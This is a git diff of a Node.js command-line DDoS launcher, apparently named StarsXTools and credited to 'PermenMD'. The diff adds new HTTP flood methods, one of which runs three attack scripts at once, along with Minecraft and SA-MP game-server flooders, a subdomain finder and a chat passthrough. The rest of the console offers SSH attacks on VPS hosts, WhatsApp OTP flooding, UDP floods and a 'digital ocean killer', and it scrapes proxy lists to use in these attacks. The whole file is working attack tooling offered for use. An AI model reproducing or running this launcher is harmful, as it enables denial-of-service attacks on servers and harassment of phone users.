@@ -6,18 +6,18 @@ const url = require('url')
 const fs = require('fs')
 const axios = require('axios')
 const path = require('path')
-const version = '5.0.1'
+const version = '5.1.7'
 let processList = [];
 
 const permen = readline.createInterface({
   input: process.stdin,
   output: process.stdout
 })
-
+// [========================================] //
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
-
+// [========================================] //
 async function banner() {
 console.clear()
 console.log(`
@@ -27,42 +27,24 @@ ___     /   ____/
 :   :  /   /:        
  :   :/___/  :        
   :       :   :        
-   :_______:   :        
+   :_______:   :    StarsXTools ${version}
            /   /    Owner: PermenMD
           /   /     Premium: true
           :  /      WhatsApp: 6285732351432
            :/       Telegram: @StarsXPermen_MD
                     Portable Tools DDoS By PermenMD
 ========================================================================`)}
-
+// [========================================] //
 async function scrapeProxy() {
   try {
-    const sources = [
-      'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-      'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000',
-      'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
-      'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
-      'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
-      'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
-      'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
-      'https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt',
-      // Tambahin URL lain di sini
-    ];
-
-    let allData = '';
-
-    for (const source of sources) {
-      const response = await fetch(source);
-      const data = await response.text();
-      allData += data + '\n'; // Gabungin semua hasil dari setiap sumber
-    }
-
-    fs.writeFileSync('proxy.txt', allData.trim(), 'utf-8');
+    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
+    const data = await response.text();
+    fs.writeFileSync('proxy.txt', data, 'utf-8');
   } catch (error) {
     console.error(`Error fetching data: ${error.message}`);
   }
 }
-
+// [========================================] //
 async function scrapeUserAgent() {
   try {
     const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
@@ -72,23 +54,23 @@ async function scrapeUserAgent() {
     console.error(`Error fetching data: ${error.message}`);
   }
 }
-
+// [========================================] //
 function clearProxy() {
   if (fs.existsSync('proxy.txt')) {
     fs.unlinkSync('proxy.txt');
   }
 }
-
+// [========================================] //
 function clearUserAgent() {
   if (fs.existsSync('ua.txt')) {
     fs.unlinkSync('ua.txt');
   }
 }
-
+// [========================================] //
 async function bootup() {
   try {
     console.log(`|| ▓░░░░░░░░░ || 10%`);
-    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino`)
+    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
     console.log(`|| ▓▓░░░░░░░░ || 20%`);
     const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
     const latestVersion = await getLatestVersion.text()
@@ -131,7 +113,7 @@ async function bootup() {
     console.log(`Are You Online?`)
   }
 }
-
+// [========================================] //
 async function killWifi() {
 const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
 const startKillwiFi = spawn('node', [wifiPath]);
@@ -149,6 +131,7 @@ if (yakin === 'exit') {
   sigma()
 }})
 }
+// [========================================] //
 async function trackIP(args) {
   if (args.length < 1) {
     console.log(`Example: track-ip <ip address>
@@ -196,7 +179,7 @@ const ipInfo = await response.json();
     }
     }
 };
-
+// [========================================] //
 async function pushOngoing(target, methods, duration) {
   const startTime = Date.now();
   processList.push({ target, methods, startTime, duration })
@@ -207,7 +190,7 @@ async function pushOngoing(target, methods, duration) {
     }
   }, duration * 1000);
 }
-
+// [========================================] //
 function ongoingAttack() {
   console.log("\nOngoing Attack:\n");
   processList.forEach((process) => {
@@ -217,7 +200,7 @@ Duration: ${process.duration} Seconds
 Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
   });
 }
-
+// [========================================] //
 async function handleAttackCommand(args) {
   if (args.length < 3) {
     console.log(`Example: attack <target> <duration> <methods>
@@ -281,11 +264,32 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
        pushOngoing(target, methods, duration)
         exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
           sigma()
+          } else if (methods === 'rape') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
+          sigma()
+          } else if (methods === 'storm') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'destroy') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'slim') {
+       pushOngoing(target, methods, duration)
+const destroy = path.join(__dirname, `/lib/cache/destroy`);
+const storm = path.join(__dirname, `/lib/cache/storm`);
+const rape = path.join(__dirname, `/lib/cache/rape`);
+        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
+          sigma()
           } else {
     console.log(`Method ${methods} not recognized.`);
   }
 };
-
+// [========================================] //
 async function killSSH(args) {
   if (args.length < 2) {
     console.log(`Example: kill-ssh <target> <duration>
@@ -322,7 +326,7 @@ const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
 exec(`node ${metode} ${target} 22 root ${duration}`)
 sigma()
 };
-
+// [========================================] //
 async function killOTP(args) {
   if (args.length < 2) {
     console.log(`Example: kill-otp <target> <duration>
@@ -354,7 +358,7 @@ const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
 exec(`node ${metode} +${target} ${duration}`)
 sigma()
 };
-
+// [========================================] //
 async function killDo(args) {
   if (args.length < 2) {
     console.log(`Example: kill-do <target> <duration>
@@ -389,7 +393,7 @@ exec(`node ${flood} https://${target} ${duration}`)
 exec(`node ${raw} http://${target} ${duration}`)
 sigma()
 };
-
+// [========================================] //
 async function udp_flood(args) {
   if (args.length < 3) {
     console.log(`Example: udp-raw <target> <port> <duration>
@@ -421,7 +425,123 @@ const metode = path.join(__dirname, `/lib/cache/udp`);
 exec(`node ${metode} ${target} ${port} ${duration}`)
 sigma()
 };
+// [========================================] //
+async function mcbot(args) {
+  if (args.length < 3) {
+    console.log(`Example: .mc-flood <target> <port> <duration>
+mc-flood 123.456.78.910 25565 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
+██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
+██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
+██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
+██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
+╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
+                   Minecraft Flood Attack Launched
+========================================================================
+Target   : ${target}
+Duration : ${duration}
+Methods  : Minecraft Flooder
+Creator  : PermenMD`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
 
+const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function samp(args) {
+  if (args.length < 3) {
+    console.log(`Example: .samp <target> <port> <duration>
+samp 123.456.78.910 7777 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
+██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
+██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
+██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
+██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
+╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
+                    SA MP Flood Attack Launched
+========================================================================
+Target   : ${target}
+Duration : ${duration}
+Methods  : SAMP Flooder
+Creator  : PermenMD`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function subdomen(args) {
+  if (args.length < 1) {
+    console.log(`Example: .subdo-finder domain
+.subdo-finder starsx.tech`);
+    sigma();
+	return
+  }
+const [domain] = args
+try {
+let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
+let hasilmanuk = response.data.data.map((data, index) => {
+return `${data}`;
+}).join('\n');
+console.clear()
+console.log(`
+██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
+██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
+██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
+██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
+██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
+╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
+                        Subdomains Finder
+========================================================================
+${hasilmanuk}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+  sigma()
+}
+sigma()
+};
+// [========================================] //
+async function chat_ai() {
+permen.question('[\x1b[1m\x1b[31mPermenMD Chat AI\x1b[0m]: \n', async (yakin) => {
+if (yakin === 'exit') {
+  console.log(`Chat Ai Has Ended`)
+  sigma()
+} else {
+  try {
+let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
+let kiddies = await skidie.data
+console.log(`
+[ Ragbot ]:
+${kiddies.data}
+`)
+  } catch (error) {
+      console.log(error)
+  }
+  chat_ai()
+}})
+}
+// [========================================] //
 async function sigma() {
 const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
 const latestNews = await getNews.text();
@@ -443,18 +563,23 @@ permen.question('[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: \n', (input) => {
 
   if (command === 'help') {
     console.log(`
-| methods   | show list of available methods
-| track-ip  | track ip address with info
-| kill-wifi | kill your wifi (termux/linux/windows only)
-| kill-ssh  | kill VPS Access 
-| kill-otp  | kill WhatsApp OTP Verification
-| attack    | launch ddos attack
-| udp-raw   | launch udp flood attack
-| kill-do   | digital ocean killer
-| ongoing   | show ongoing attack
-| news      | show latest permenmd news
-| credits   | show creator of these tools
-| clear     | clear terminal
+| methods      | show list of available methods
+| track-ip     | track ip address with info
+| subdo-finder | find all subdomain from domain
+| kill-wifi    | kill your wifi (termux/linux/windows only)
+| kill-ssh     | kill VPS Access 
+| kill-otp     | kill WhatsApp OTP Verification
+| kill-ping    | sending death pinger
+| samp         | S.A.M.P Flooder
+| mc-flood     | Minecraft Bot Flooder
+| attack       | launch ddos attack
+| udp-raw      | launch udp flood attack
+| kill-do      | digital ocean killer
+| ongoing      | show ongoing attack
+| news         | show latest permenmd news
+| ai           | Chat With Ai
+| credits      | show creator of these tools
+| clear        | clear terminal
 `);
     sigma();
   } else if (command === 'methods') {
@@ -467,6 +592,10 @@ permen.question('[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: \n', (input) => {
 || raw        || Huge RPS Flexing XD
 || bypass     || Bypass With High Power
 || thunder    || Massive Power Methods
+|| storm      || The Raining Request
+|| rape       || Bypass Protection
+|| destroy    || Kill That Socket
+|| slim       || Oh Is Fit There
 [=========================================]
 `);
     sigma();
@@ -493,6 +622,18 @@ ${creatorCredits}`);
     sigma()
   } else if (command === 'track-ip') {
     trackIP(args);
+  } else if (command === 'ai') {
+    console.log(`PermenMD Ai Ragbot Started
+Type "exit" To Stop Chat`);
+    chat_ai()
+  } else if (command === 'mc-flood') {
+    mcbot(args)
+  } else if (command === 'kill-ping') {
+    pod(args)
+  } else if (command === 'samp') {
+    samp(args)
+  } else if (command === 'subdo-finder') {
+    subdomen(args)
   } else if (command === 'kill-wifi') {
     killWifi()
   } else if (command === 'clear') {
@@ -504,11 +645,12 @@ ${creatorCredits}`);
   }
 });
 }
-
+// [========================================] //
 function clearall() {
   clearProxy()
   clearUserAgent()
 }
+// [========================================] //
 process.on('exit', clearall);
 process.on('SIGINT', () => {
   clearall()
